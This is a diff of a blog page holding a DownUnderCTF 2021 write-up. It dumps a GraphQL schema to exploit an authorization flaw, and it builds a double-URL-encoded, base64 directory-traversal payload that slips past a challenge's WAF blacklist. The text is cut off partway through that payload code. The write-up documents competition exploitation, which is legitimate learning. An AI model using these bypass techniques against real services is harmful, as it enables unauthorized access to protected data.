@@ -1,153 +1,575 @@
-<!doctype html>
-<html lang="en-us">
-  <head>
-    <title>DownUnderCTF2021 // D@rkmod3</title>
-    <link rel="shortcut icon" href="/favicon.ico" />
-    <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.88.1" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="author" content="John Doe" />
-    <meta name="description" content="" />
-    <link rel="stylesheet" href="/css/main.min.8751543c8da766b689e79176cbd58ed78b7c1b5ffde4bc716e1da317e5caccbe.css" />
-
-    
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="DownUnderCTF2021"/>
-<meta name="twitter:description" content="Web (7/11) My team ends up at 11th place all over 2142 teams, that is a proud achievement right? FarSight  Difficult: easy  Login to this page, notice to the burp proxy history, i found a route /graphql.
-I use a tool named GraphQL Playground to analysis scheme and execute query command.
-type ConfigPair { key: String! value: String! } type Mutation { loginOrRegister(username: String!, password: String!): String newPage(name: String, content: String, siteId: ID!"/>
-
-    <meta property="og:title" content="DownUnderCTF2021" />
-<meta property="og:description" content="Web (7/11) My team ends up at 11th place all over 2142 teams, that is a proud achievement right? FarSight  Difficult: easy  Login to this page, notice to the burp proxy history, i found a route /graphql.
-I use a tool named GraphQL Playground to analysis scheme and execute query command.
-type ConfigPair { key: String! value: String! } type Mutation { loginOrRegister(username: String!, password: String!): String newPage(name: String, content: String, siteId: ID!" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/downunderctf/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-09-26T00:00:00+00:00" />
-<meta property="article:modified_time" content="2021-09-26T00:00:00+00:00" />
+<!DOCTYPE html>
+<html lang="en" data-mode="dark">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.98.0">
+<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>DownUnderCTF2021 | D@rkmod3</title>
+
+
+
+
+
+
+<meta name="robots" content="index follow">
+
+
+
+
+  
+    <link rel="canonical" href="/posts/downunderctf/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="D@rkmod3">
+<meta property="og:title" content="DownUnderCTF2021">
+
+  <meta property="og:url" content="/posts/downunderctf/">
+
+
+
+
+
+
+
+  
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2021-09-26">
+    <meta property="article:modified_time" content="2021-09-26">
+    <meta property="og:updated_time" content="2021-09-26">
+  
+
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": ""
+      },
+      "headline": "DownUnderCTF2021",
+      "description": "",
+      
+      "url": "\/posts\/downunderctf\/",
+      "inLanguage": "en",
+      "datePublished": "2021-09-26",
+      "dateModified": "2021-09-26",
+      "wordCount" : "593",
+      "publisher": {
+        "@type": "Person",
+        "name": ""
+      },
+      "author": {
+        "@type": "Person",
+        "name": "",
+        
+        
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.860f44e9e1bd35f9d67581a67fe8cdb3a88bf684226678fdc2227107af13e885.css" integrity="sha256-hg9E6eG9NfnWdYGmf&#43;jNs6iL9oQiZnj9wiJxB68T6IU=" crossorigin="anonymous">
+
+
+
+<noscript>
+
+  
+  
+
+  
+    <meta name="theme-color" content="#1dbc91" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#1f676b" media="(prefers-color-scheme: light)">
+  
+
+  
+  <link rel="stylesheet" href="/css/noscript.min.3f3b95436b19eaeb9223fb12c0b86737d53ee0a47fdba271a886c244bc03975c.css" integrity="sha256-PzuVQ2sZ6uuSI/sSwLhnN9U&#43;4KR/26JxqIbCRLwDl1w=" crossorigin="anonymous">
+
+</noscript>
+
+
+
+<link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
 
   </head>
+
   <body>
-    <header class="app-header">
-      <a href=""><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
-      <h1>D@rkmod3</h1>
-      <p>Hack or hacked</p>
-    </header>
-    <main class="app-container">
+
+    <header>
       
-  <article class="post">
-    <header class="post-header">
-      <h1 class ="post-title">DownUnderCTF2021</h1>
-      <div class="post-meta">
-        <div>
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
-  <title>calendar</title>
-  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
-</svg>
-          Sep 26, 2021
-        </div>
-        <div>
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
-  <title>clock</title>
-  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
-</svg>
-          3 min read
-        </div>
-      </div>
+
+  <a href="/">D@rkmod3</a>
+
+
+
+
+
     </header>
-    <div class="post-content">
-      <h1 id="web-711">Web (7/11)</h1>
-<h3 id="my-team-ends-up-at-11th-place-all-over-2142-teams-that-is-a-proud-achievement-right">My team ends up at 11th place all over 2142 teams, that is a proud achievement right?</h3>
-<p><img src="../../archivement/ductf-certificate.jpg" alt="cert"></p>
-<h1 id="farsight">FarSight</h1>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        <h1>DownUnderCTF2021</h1>
+
+        
+          <p>
+            
+              Published on <time datetime="2021-09-26">2021-09-26</time>
+            
+          </p>
+        
+        
+        
+        
+      </header>
+    
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <h1 id="web-711">Web (7/11)</h1> 
+
+
+
+
+
+
+
+
+
+
+  <h3 id="my-team-ends-up-at-11th-place-all-over-2142-teams-that-is-a-proud-achievement-right"><a class="anchor" href="#my-team-ends-up-at-11th-place-all-over-2142-teams-that-is-a-proud-achievement-right" title='Anchor for: My team ends up at 11th place all over 2142 teams, that is a proud achievement right?.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> My team ends up at 11th place all over 2142 teams, that is a proud achievement right?</h3> 
+
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/archivement/ductf-certificate.jpg"
+      
+    />
+
+  
+
+</p>
+
+
+
+
+
+
+
+
+
+  <h1 id="farsight">FarSight</h1> 
+
 <ul>
 <li>Difficult: easy</li>
 </ul>
 <p>Login to this page, notice to the burp proxy history, i found a route <code>/graphql</code>.</p>
 <p>I use a tool named <code>GraphQL Playground</code> to analysis scheme and execute query command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-graphql" data-lang="graphql"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">ConfigPair</span> {
-  key: <span style="color:#a6e22e">String</span>!
-  value: <span style="color:#a6e22e">String</span>!
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Mutation</span> {
-  loginOrRegister(username: <span style="color:#a6e22e">String</span>!, password: <span style="color:#a6e22e">String</span>!): <span style="color:#a6e22e">String</span>
-  newPage(name: <span style="color:#a6e22e">String</span>, content: <span style="color:#a6e22e">String</span>, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
-  setSiteConfig(config: <span style="color:#a6e22e">String</span>!, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
-  importPage(pageId: <span style="color:#a6e22e">ID</span>!, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Page</span> {
-  id: <span style="color:#a6e22e">ID</span>!
-  name: <span style="color:#a6e22e">String</span>!
-  content: <span style="color:#a6e22e">String</span>!
-  ownerSite: <span style="color:#a6e22e">Site</span>!
-  siteRefs: [<span style="color:#a6e22e">Site</span>!]!
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Query</span> {
-  me: <span style="color:#a6e22e">User</span>
-  site(id: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">Site</span>
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Site</span> {
-  id: <span style="color:#a6e22e">ID</span>!
-  name: <span style="color:#a6e22e">String</span>!
-  pages: [<span style="color:#a6e22e">Page</span>!]!
-  public: <span style="color:#a6e22e">Boolean</span>!
-  owner: <span style="color:#a6e22e">User</span>!
-  config: [<span style="color:#a6e22e">ConfigPair</span>!]!
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> {
-  id: <span style="color:#a6e22e">ID</span>!
-  username: <span style="color:#a6e22e">String</span>!
-  sites: [<span style="color:#a6e22e">Site</span>!]!
-}
-</code></pre></div><p>Focus to <code>importPage</code> mutation, we can import an existing page into the site.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">ConfigPair</span> {
+</span></span><span style="display:flex;"><span>  key: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>  value: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Mutation</span> {
+</span></span><span style="display:flex;"><span>  loginOrRegister(username: <span style="color:#a6e22e">String</span>!, password: <span style="color:#a6e22e">String</span>!): <span style="color:#a6e22e">String</span>
+</span></span><span style="display:flex;"><span>  newPage(name: <span style="color:#a6e22e">String</span>, content: <span style="color:#a6e22e">String</span>, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>  setSiteConfig(config: <span style="color:#a6e22e">String</span>!, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>  importPage(pageId: <span style="color:#a6e22e">ID</span>!, siteId: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Page</span> {
+</span></span><span style="display:flex;"><span>  id: <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>  name: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>  content: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>  ownerSite: <span style="color:#a6e22e">Site</span>!
+</span></span><span style="display:flex;"><span>  siteRefs: [<span style="color:#a6e22e">Site</span>!]!
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Query</span> {
+</span></span><span style="display:flex;"><span>  me: <span style="color:#a6e22e">User</span>
+</span></span><span style="display:flex;"><span>  site(id: <span style="color:#a6e22e">ID</span>!): <span style="color:#a6e22e">Site</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Site</span> {
+</span></span><span style="display:flex;"><span>  id: <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>  name: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>  pages: [<span style="color:#a6e22e">Page</span>!]!
+</span></span><span style="display:flex;"><span>  public: <span style="color:#a6e22e">Boolean</span>!
+</span></span><span style="display:flex;"><span>  owner: <span style="color:#a6e22e">User</span>!
+</span></span><span style="display:flex;"><span>  config: [<span style="color:#a6e22e">ConfigPair</span>!]!
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>  id: <span style="color:#a6e22e">ID</span>!
+</span></span><span style="display:flex;"><span>  username: <span style="color:#a6e22e">String</span>!
+</span></span><span style="display:flex;"><span>  sites: [<span style="color:#a6e22e">Site</span>!]!
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Focus to <code>importPage</code> mutation, we can import an existing page into the site.</p>
 <p>Step 1: Find out id of our site.</p>
-<p><img src="img/1.png" alt="1"></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/1.png"
+      alt="1"
+    />
+
+  
+
+</p>
 <p>Step 2: Add pageid=0 to our site</p>
-<p><img src="img/2.png" alt="2"></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/2.png"
+      alt="2"
+    />
+
+  
+
+</p>
 <p>Retrive information of page, I realise a interesting information:</p>
-<pre tabindex="0"><code>&quot;content&quot;: &quot;# Flags and configurations
-There might be something interesting in the configuration for this site `;)`&quot;
-</code></pre><p><img src="img/3.png" alt="3"></p>
+<pre aria-label="Box containing code sample." tabindex=0><code>&#34;content&#34;: &#34;# Flags and configurations
+There might be something interesting in the configuration for this site `;)`&#34;
+</code></pre><p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/3.png"
+      alt="3"
+    />
+
+  
+
+</p>
 <p>And i found 2 things:</p>
-<p><img src="img/5.png" alt="5"></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/5.png"
+      alt="5"
+    />
+
+  
+
+</p>
 <p>With my alnalysis, <code>ownerSite</code> field can be vulnerable here, it permits anyuser access to another site on a imported site.</p>
 <p>Thus, We can retrieve config of siteid=0 by <code>query site-&gt;pages-&gt;ownerSite-&gt;config</code></p>
-<p><img src="img/6.png" alt="6"></p>
-<h1 id="jasons-proxy">Jasons Proxy</h1>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/DownunderCTF2021/6.png"
+      alt="6"
+    />
+
+  
+
+</p>
+
+
+
+
+
+
+
+
+
+  <h1 id="jasons-proxy">Jasons Proxy</h1> 
+
 <ul>
 <li>Difficult: hard</li>
 </ul>
 <p>The idea of this challenge is very clearly. We must bypass WAF to pass proxy and get flag.</p>
 <p>Review quick details:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http://127.0.0.1/static/images/&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/static/images/&#34;</span>]
-blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;flag&#34;</span>]
-remove_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;OR&#34;</span>,<span style="color:#e6db74">&#34;SELECT&#34;</span>,<span style="color:#e6db74">&#34;FROM&#34;</span>,<span style="color:#e6db74">&#34;;&#34;</span>,<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;./&#34;</span>,<span style="color:#e6db74">&#34;....//&#34;</span>]
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">waf</span>(url):
-	resp <span style="color:#f92672">=</span> unquote(url)
-	whitelist_check <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-	<span style="color:#66d9ef">for</span> uri <span style="color:#f92672">in</span> whitelist:
-		<span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>startswith(uri):
-			whitelist_check <span style="color:#f92672">=</span> uri
-			<span style="color:#66d9ef">break</span>
-	<span style="color:#66d9ef">if</span> whitelist_check <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
-		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-	<span style="color:#66d9ef">for</span> forbidden <span style="color:#f92672">in</span> blacklist:
-		<span style="color:#66d9ef">if</span> forbidden <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>lower():
-			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-	<span style="color:#66d9ef">for</span> badstr <span style="color:#f92672">in</span> remove_list:
-		resp <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>replace(badstr,<span style="color:#e6db74">&#34;BLOCKEDBY1337WAF&#34;</span>)
-	resp <span style="color:#f92672">=</span> urlparse(resp)
-	resp <span style="color:#f92672">=</span> unquote(abspath(resp<span style="color:#f92672">.</span>path))
-	<span style="color:#66d9ef">return</span> urljoin(whitelist_check,resp)
-</code></pre></div><p>function <code>waf()</code> have execution flow is as follow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http://127.0.0.1/static/images/&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/static/images/&#34;</span>]
+</span></span><span style="display:flex;"><span>blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;flag&#34;</span>]
+</span></span><span style="display:flex;"><span>remove_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;OR&#34;</span>,<span style="color:#e6db74">&#34;SELECT&#34;</span>,<span style="color:#e6db74">&#34;FROM&#34;</span>,<span style="color:#e6db74">&#34;;&#34;</span>,<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;./&#34;</span>,<span style="color:#e6db74">&#34;....//&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">waf</span>(url):
+</span></span><span style="display:flex;"><span>	resp <span style="color:#f92672">=</span> unquote(url)
+</span></span><span style="display:flex;"><span>	whitelist_check <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> uri <span style="color:#f92672">in</span> whitelist:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>startswith(uri):
+</span></span><span style="display:flex;"><span>			whitelist_check <span style="color:#f92672">=</span> uri
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> whitelist_check <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> forbidden <span style="color:#f92672">in</span> blacklist:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> forbidden <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> badstr <span style="color:#f92672">in</span> remove_list:
+</span></span><span style="display:flex;"><span>		resp <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>replace(badstr,<span style="color:#e6db74">&#34;BLOCKEDBY1337WAF&#34;</span>)
+</span></span><span style="display:flex;"><span>	resp <span style="color:#f92672">=</span> urlparse(resp)
+</span></span><span style="display:flex;"><span>	resp <span style="color:#f92672">=</span> unquote(abspath(resp<span style="color:#f92672">.</span>path))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> urljoin(whitelist_check,resp)
+</span></span></code></pre></div><p>function <code>waf()</code> have execution flow is as follow:</p>
 <p><code>unquote</code> -&gt; <code>startswith whitelist</code> -&gt; <code>filter /admin|flag/i</code> -&gt; <code>replace badstr</code>
 -&gt; <code>urlparse</code> -&gt; <code>unquote(abspath)</code> -&gt; <code>return whitelist_check + resp</code></p>
 <p>Next review the <code>app.py</code> file:</p>
@@ -159,77 +581,169 @@ remove_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#
 <p>Next look to <code>/admin/flag</code>:</p>
 </li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># 1)</span>
-<span style="color:#66d9ef">if</span> img<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;http://127.0.0.1/static/images/&#39;</span>):
-			<span style="color:#66d9ef">return</span> b64encode(get(<span style="color:#e6db74">&#34;http://127.0.0.1:9097/&#34;</span><span style="color:#f92672">+</span>img)<span style="color:#f92672">.</span>content)<span style="color:#f92672">.</span>decode()
-<span style="color:#75715e"># 2)</span>
-<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/admin/flag&#39;</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_flag</span>():
-	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>remote_addr <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>:
-		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized.&#34;</span>, <span style="color:#ae81ff">401</span>
-	<span style="color:#66d9ef">return</span> str(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;FLAG&#39;</span>)), <span style="color:#ae81ff">200</span>
-</code></pre></div><p>Suddenly, an idea popped into my head <code>directory traversal</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> img<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;http://127.0.0.1/static/images/&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> b64encode(get(<span style="color:#e6db74">&#34;http://127.0.0.1:9097/&#34;</span><span style="color:#f92672">+</span>img)<span style="color:#f92672">.</span>content)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/admin/flag&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_flag</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>remote_addr <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized.&#34;</span>, <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> str(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;FLAG&#39;</span>)), <span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><p>Suddenly, an idea popped into my head <code>directory traversal</code></p>
 <p>Combine 1 and 2, we have a payload:</p>
-<pre tabindex="0"><code>http://127.0.0.1/static/images/../../admin/flag
-</code></pre><h3 id="how-to-bypass-proxy">How to bypass proxy?</h3>
+<pre aria-label="Box containing code sample." tabindex=0><code>http://127.0.0.1/static/images/../../admin/flag
+</code></pre>
+
+
+
+
+
+
+
+
+  <h3 id="how-to-bypass-proxy"><a class="anchor" href="#how-to-bypass-proxy" title='Anchor for: How to bypass proxy?.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> How to bypass proxy?</h3> 
+
 <p>URL encode is useful in this case.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1/static/images/../../admin/flag&#39;</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">urlenc</span>(s):
-  <span style="color:#66d9ef">return</span> hex(ord(s))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;%&#39;</span>)
-
-<span style="color:#75715e"># first, replace ../ to .%2e/</span>
-payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;./&#39;</span>, urlenc(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span>)
-<span style="color:#75715e"># http://127.0.0.1/static/images/.%2e/.%2e/admin/flag</span>
-
-<span style="color:#75715e"># second, i replace a and f</span>
-payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;admin&#39;</span>, urlenc(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;dmin&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;flag&#39;</span>, urlenc(<span style="color:#e6db74">&#39;f&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;lag&#39;</span>)
-
-<span style="color:#75715e"># double encode to bypass unquote</span>
-payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%61&#39;</span>, <span style="color:#e6db74">&#39;%2561&#39;</span>) \
-        <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%66&#39;</span>, <span style="color:#e6db74">&#39;%2566&#39;</span>)  \
-        <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">%2e</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%2e%252e</span><span style="color:#e6db74">&#39;</span>) \
-
-<span style="color:#75715e"># finally, encode to base64</span>
-<span style="color:#f92672">import</span> base64
-payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode())
-print(payload<span style="color:#f92672">.</span>decode())
-<span style="color:#75715e">#aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==</span>
-</code></pre></div><p>It looks good, but not pass <code>_security</code> *so painful :(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1/static/images/../../admin/flag&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">urlenc</span>(s):
